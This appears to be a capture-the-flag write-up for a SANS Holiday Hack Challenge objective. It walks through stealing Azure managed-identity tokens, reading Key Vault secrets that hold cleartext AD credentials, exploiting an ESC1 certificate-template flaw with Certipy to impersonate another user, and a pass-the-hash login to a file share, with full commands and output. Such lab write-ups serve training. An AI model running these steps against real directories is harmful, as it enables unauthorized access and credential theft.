# OBJECTIVE 19 - Active Directory #

## OBJECTIVE : ##
>Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the *FileShare*?
#  

## HINTS: ##
<details>
  <summary>Hints provided for Objective 19</summary>
  
>-	Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently, the service used to manage them can have misconfigurations too.
>-	It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.
</details>

#  

## PROCEDURE : ##
Now that we are logged in as alabaster (after complecting [OBJECTIVE 17 - Certificate SSHennanigans](OBJECTIVE%2017%20-%20SSHennanigans%20.md)), we can go ahead and request an Azure access token for our new user:
```
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/' -H Metadata:true -s | jq
```
The contents of this token are stored in the shell variable `$TOKEN`.

Now we can list the available resources on Azure by calling the REST API with curl:
```
$ curl https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?api-version=2021-04-01 -H "Authorization: Bearer $TOKEN" 
```
```
{  "value": [
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv",
      "name": "northpole-it-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    },
    {
      "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
      "name": "northpole-ssh-certs-kv",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {}
    }]}
```
From the resulting output we can see there are two keyvaults;  `northpole-it-kv` and `northpole-ssh-certs-kv`.  It would be a good idea to see what more we can learn about these vaults by using suitable REST API calls[^1] . But first we need to create a new token to use with `https://vault.azure.net` (instead of `https://management.azure.com`).
```
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://vault.azure.net' -H Metadata:true -s | jq
```

We’ll assing this new token to the shell variable `$TOKEN2` and we can now find more information about the key vaults.

```
curl https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01 -H "Authorization:Bearer $TOKEN2" | jq
```

We can get a list of secrets by using the following API call, from which we learn that there is a secret called `tmpAddUserScript` which is recoverable.
```
alabaster@ssh-server-vm:~/impacket$ curl https://northpole-it-kv.vault.azure.net/secrets/?api-version=7.4 -H "$TOKEN2" | jq
```
```
{
  "value": [
    {
      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
      "attributes": {
        "enabled": true,
        "created": 1699564823,
        "updated": 1699564823,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {}
    }
  ],
  "nextLink": null
}
```

So, we can now retrieve the secret as follows:
```
alabaster@ssh-server-vm:~/impacket$ curl https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4 -H "$TOKEN2" | jq
```
```
{
  "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",                                                                   
  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
  "attributes": {
    "enabled": true,
    "created": 1699564823,
    "updated": 1699564823,
    "recoveryLevel": "Recoverable+Purgeable",
    "recoverableDays": 90
  },
  "tags": {}
}
```

The resulting output gives us tons of useful information.  Including the AD domain, the domain controller’s IP and even a username and cleartext password.
`  $UserName = `**`elfy`**

`  $UserDomain =` **`northpole.local`**

`  $Password:` **``J4`ufC49/J4766``**

`  $DCIP =` **`10.0.0.53`**

Armed with this information we can start using the tools found in Alabaster’s directory.  We can start with **Certipy** with the `find -vulnerable` command (as conveniently suggested in [OBJECTIVE 4 – Reportinator](OBJECTIVE%2004%20-%20Reportinator%20.md)).  Watch-out for the escape character before the "`" in the password.
```
certipy find -vulnerable -dc-ip 10.0.0.53 -target northpole.local -u elfy@northpole.local -p "J4\`ufC49/J4766"
```

Looking at the contents of the text file generated by Certipy we can immediately see that it has flagged an **ESC1** vulnerability[^2]  with the CA allowing users with low domain privileges to enrol new users, manager approval is disabled and the template allows users to specify a Subject Alternative Name (SAN) when requesting a certificate.  We also learn that the template name is `NorthPoleUsers` and that the Certificate Authority name is `northpole-npdc01-CA`.

![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2023/assets/60655500/9204c423-495b-4fb0-a214-244a2a4ea796)

At this point it is useful for us to try and find out what other users might be on the AD apart from `elfy` to determine which one we should try to impersonate.  To achieve this, we can use `GetADUsers.py`, passing the username and password for `elfy`. 
```
$ GetADUsers.py -all northpole.local/elfy:J4\`ufC49/J4766 -dc-ip 10.0.0.53
```
```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying 10.0.0.53 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ----------------------  -------------------  -------------------
alabaster                                    2024-01-02 01:03:04.977413  2024-01-02 01:16:32.834625 
Guest                                         <never>              <never>             
krbtgt                                        2024-01-02 01:10:17.609745  <never>             
elfy                                          2024-01-02 01:12:48.407584  2024-01-02 13:24:22.777995 
wombleycube                                   2024-01-02 01:12:48.501337  2024-01-02 13:18:56.309364
```

Nice! We can see that **Wombley Cube** has an account on the AD with username `wombleycube`.  So, we can now use Certipy to request a certificate for `wombleycube@northpole.local` using the credentials for `elfy`!

```
$ certipy req -u elfy@northpole.local -p "J4\`ufC49/J4766" -ca northpole-npdc01-CA -template NorthPoleUsers -upn wombleycube@northpole.local -dc-ip 10.0.0.53
```
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 77
[*] Got certificate with UPN 'wombleycube@northpole.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'wombleycube.pfx'
```

This creates a certificate file called `wombleycube.pfx` and we can now use this with Certipy to authenticate to the domain controller:
```
$ certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53
```
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'wombleycube.ccache'
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
```

Now we have a NT hash for wombleycube@northpole.local and we can use a **pass-the-hash** attack to access the file-share using `smbclient.py`.
```
$ smbclient.py -dc-ip 10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 northpole.local/wombleycube@10.0.0.53
```
```
# use FileShare
# ls
drw-rw-rw-          0  Tue Jan  2 01:13:44 2024 .
drw-rw-rw-          0  Tue Jan  2 01:13:41 2024 ..
-rw-rw-rw-     701028  Tue Jan  2 01:13:43 2024 Cookies.pdf
-rw-rw-rw-    1521650  Tue Jan  2 01:13:44 2024 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Tue Jan  2 01:13:44 2024 SignatureCookies.pdf
drw-rw-rw-          0  Tue Jan  2 01:13:44 2024 super_secret_research
-rw-rw-rw-        165  Tue Jan  2 01:13:44 2024 todo.txt
# cd sup[
.                      ..                     super_secret_research  
# cd super_secret_research
# ls
drw-rw-rw-          0  Tue Jan  2 01:13:44 2024 .
drw-rw-rw-          0  Tue Jan  2 01:13:44 2024 ..
-rw-rw-rw-        231  Tue Jan  2 01:13:44 2024 InstructionsForEnteringSatelliteGroundStation.txt
```
And that completes this challenge – we have the name of the secret file, and we can also peek inside for an interesting message.😊

```
# cat InstructionsforEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.
```


[^1]:[https://learn.microsoft.com/en-us/rest/api/keyvault/keyvault/vaults/list-by-subscription?view=rest-keyvault-keyvault-2022-07-01&tabs=HTTP](https://learn.microsoft.com/en-us/rest/api/keyvault/keyvault/vaults/list-by-subscription?view=rest-keyvault-keyvault-2022-07-01&tabs=HTTP)
[^2]:[https://github.com/arth0sz/Practice-AD-CS-Domain-Escalation](https://github.com/arth0sz/Practice-AD-CS-Domain-Escalation)
